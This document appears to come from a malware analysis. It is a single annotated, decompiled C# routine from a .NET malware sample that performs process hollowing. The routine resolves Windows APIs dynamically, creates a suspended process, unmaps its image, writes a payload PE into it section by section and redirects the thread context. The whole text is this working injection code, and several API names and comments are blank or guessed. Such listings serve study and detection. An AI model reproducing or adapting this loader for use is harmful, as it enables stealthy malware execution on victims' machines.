### Process Hollowing
```csharp
public static void smethod_4(byte[] byte_0, string string_0)
{
    // if no target supplied -> use .NET runtime dir + "<decrypted filename>"
    if (Operators.CompareString(string_0, null, false) == 0)
    {
        // decrypt_b64_AES("u/kmrYrQevGpUj3toll5Yw==") => "<decrypted filename>"
        string_0 = RuntimeEnvironment.GetRuntimeDirectory() + /* "<decrypted filename>" */ "";
    }

    // Resolve APIs dynamically (module, proc)
    // GClass1.smethod_0<Delegate1>("kernel32", "CreateProcessA")
    GClass1.Delegate1 @delegate = GClass1.smethod_0<GClass1.Delegate1>(
        /* "kernel32" */ "kernel32",
        /* "CreateProcessA" */ "CreateProcessA");

    // GClass1.smethod_0<Delegate2>("kernel32","GetThreadContext")
    GClass1.Delegate2 delegate2 = GClass1.smethod_0<GClass1.Delegate2>(
        /* "kernel32" */ "kernel32",
        /* "GetThreadContext" */ "GetThreadContext");

    // GClass1.smethod_0<Delegate3>("ntdll","NtUnmapViewOfSection")
    GClass1.Delegate3 delegate3 = GClass1.smethod_0<GClass1.Delegate3>(
        /* "ntdll" */ "ntdll",
        /* "NtUnmapViewOfSection" */ "NtUnmapViewOfSection");

    // GClass1.smethod_0<Delegate4>("kernel32","VirtualAllocEx")  (decrypted name not shown earlier)
    GClass1.Delegate4 delegate4 = GClass1.smethod_0<GClass1.Delegate4>(
        /* "kernel32" */ "kernel32",
        /* "VirtualAllocEx" */ "VirtualAllocEx");

    // GClass1.smethod_0<Delegate5>("kernel32","CloseHandle")  (example)
    GClass1.Delegate5 delegate5 = GClass1.smethod_0<GClass1.Delegate5>(
        /* "kernel32" */ "kernel32",
        /* "<proc name>" */ "");

    // GClass1.smethod_0<Delegate6>("kernel32","SetThreadContext") (or similar)
    GClass1.Delegate6 delegate6 = GClass1.smethod_0<GClass1.Delegate6>(
        /* "kernel32" */ "kernel32",
        /* "SetThreadContext" */ "SetThreadContext");

    // GClass1.smethod_0<Delegate7>("kernel32","CreateRemoteThread") (or CreateProcessThread helper)
    GClass1.Delegate7 delegate7 = GClass1.smethod_0<GClass1.Delegate7>(
        /* "kernel32" */ "kernel32",
        /* "<proc name>" */ "");

    // GClass1.smethod_0<Delegate8>("kernel32","VirtualProtectEx")
    GClass1.Delegate8 delegate8 = GClass1.smethod_0<GClass1.Delegate8>(
        /* "kernel32" */ "kernel32",
        /* "VirtualProtectEx" */ "VirtualProtectEx");

    // GClass1.smethod_0<Delegate9>("kernel32","WriteProcessMemory")
    GClass1.Delegate9 delegate9 = GClass1.smethod_0<GClass1.Delegate9>(
        /* "kernel32" */ "kernel32",
        /* "WriteProcessMemory" */ "WriteProcessMemory");

    // PE header offsets
    int num = BitConverter.ToInt32(byte_0, 60);                 // e_lfanew
    checked
    {
        int num2 = (int)BitConverter.ToInt16(byte_0, num + 6);  // NumberOfSections
        IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_0, num + 84)); // SizeOfImage? (or SizeOfHeaders)
        byte[] array = new byte[68];
        IntPtr[] array2 = new IntPtr[4];
        IntPtr intPtr2;

        // CreateProcessA / CreateProcess target process suspended
        // @delegate(...) == CreateProcessA(...) invocation
        if (!@delegate(null, new StringBuilder(string_0), intPtr2, intPtr2, false, 4, intPtr2, null, array, array2))
        {
            return;
        }

        uint[] array3 = new uint[179];
        array3[0] = 65538U;

        // delegate2 -> GetThreadContext / Read context of suspended process
        if (delegate2(array2[1], array3))
        {
            // delegate4 -> VirtualAllocEx / query/extract image base from remote process PEB
            GClass1.Delegate4 delegate10 = delegate4;
            IntPtr intPtr3 = array2[0];
            IntPtr intPtr4 = new IntPtr((long)(unchecked((ulong)array3[41]) + 8UL));
            IntPtr intPtr5 = intPtr4;
            IntPtr intPtr6 = new IntPtr(4);
            IntPtr intPtr7;
            IntPtr intPtr8;

            // delegate10(...)=ReadProcessMemory/VirtualQuery? and delegate3 -> NtUnmapViewOfSection check
            if (delegate10(intPtr3, intPtr5, ref intPtr7, intPtr6, ref intPtr8) && unchecked((ulong)delegate3(array2[0], intPtr7)) == 0UL)
            {
                // delegate7 => create remote section / map/allocate (Decrypted proc name earlier unclear)
                GClass1.Delegate7 delegate11 = delegate7;
                IntPtr intPtr9 = array2[0];
                IntPtr intPtr10 = new IntPtr(BitConverter.ToInt32(byte_0, num + 52)); // SizeOfHeaders?
                IntPtr intPtr11 = intPtr10;
                IntPtr intPtr12 = new IntPtr(BitConverter.ToInt32(byte_0, num + 80)); // SizeOfImage?
                IntPtr intPtr13 = delegate11(intPtr9, intPtr11, intPtr12, 12288, 64);

                // WriteProcessMemory -> write PE headers + sections into remote process
                delegate9(array2[0], intPtr13, byte_0, intPtr, ref intPtr8);

                int num3 = 0;
                int num4 = num2 - 1;
                for (int i = num3; i <= num4; i++)
                {
                    int[] array4 = new int[10];
                    Buffer.BlockCopy(byte_0, num + 248 + i * 40, array4, 0, 40); // section table entry

                    byte[] array5 = new byte[array4[4] - 1 + 1]; // SizeOfRawData
                    Buffer.BlockCopy(byte_0, array4[5], array5, 0, array5.Length); // PointerToRawData

                    // write section raw data into remote (WriteProcessMemory)
                    GClass1.Delegate9 delegate12 = delegate9;
                    IntPtr intPtr14 = array2[0];
                    intPtr12 = new IntPtr(intPtr13.ToInt32() + array4[3]); // VirtualAddress offset
                    IntPtr intPtr15 = intPtr12;
                    byte[] array6 = array5;
                    intPtr10 = new IntPtr(array5.Length);
                    delegate12(intPtr14, intPtr15, array6, intPtr10, ref intPtr8);

                    // set memory protections (VirtualProtectEx)
                    GClass1.Delegate8 delegate13 = delegate8;
                    IntPtr intPtr16 = array2[0];
                    intPtr12 = new IntPtr(intPtr13.ToInt32() + array4[3]);
                    IntPtr intPtr17 = intPtr12;
                    intPtr10 = new IntPtr(array4[2]); // VirtualSize
                    int num5;
                    delegate13(intPtr16, intPtr17, intPtr10, GClass1.int_0[(array4[9] >> 29) & 7], ref num5);
                }

                // update remote PEB ImageBase (write new image base)
                GClass1.Delegate9 delegate14 = delegate9;
                IntPtr intPtr18 = array2[0];
                intPtr12 = new IntPtr((long)(unchecked((ulong)array3[41]) + 8UL));
                IntPtr intPtr19 = intPtr12;
                byte[] bytes = BitConverter.GetBytes(intPtr13.ToInt32());
                intPtr10 = new IntPtr(4);
                delegate14(intPtr18, intPtr19, bytes, intPtr10, ref intPtr8);

                // set relocation/entry/EIP in context and resume (delegate6 likely SetThreadContext)
                array3[44] = (uint)(intPtr13.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
                delegate6(array2[1], array3);
            }
        }

        // cleanup: CloseHandle / resume or release handles (delegate5 likely CloseHandle)
        delegate5(array2[1]);
    }
}
```
